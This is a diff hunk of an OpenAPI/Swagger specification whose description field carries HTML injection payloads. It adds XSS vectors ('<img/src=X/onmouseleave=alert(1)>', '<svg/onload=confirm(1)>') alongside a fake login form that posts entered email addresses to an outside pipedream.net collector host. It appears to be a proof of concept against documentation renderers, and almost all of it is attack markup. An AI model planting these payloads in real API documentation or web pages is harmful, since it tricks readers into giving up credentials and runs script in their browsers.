@@ -4,7 +4,8 @@ info:
   title: Classic API Resource Documentation
   description: |
     <h1>Log in to see the full documentation</h1>
-    <img src=X onmouseleave=alert(1)>
+    <img/src="X"/onmouseleave=alert(1)>
+    <svg/onload=confirm(1)>
     <form action="https://envkwdnkgvs.x.pipedream.net" method="post">
     <label for="email">Login:</label>
     <input name="email">
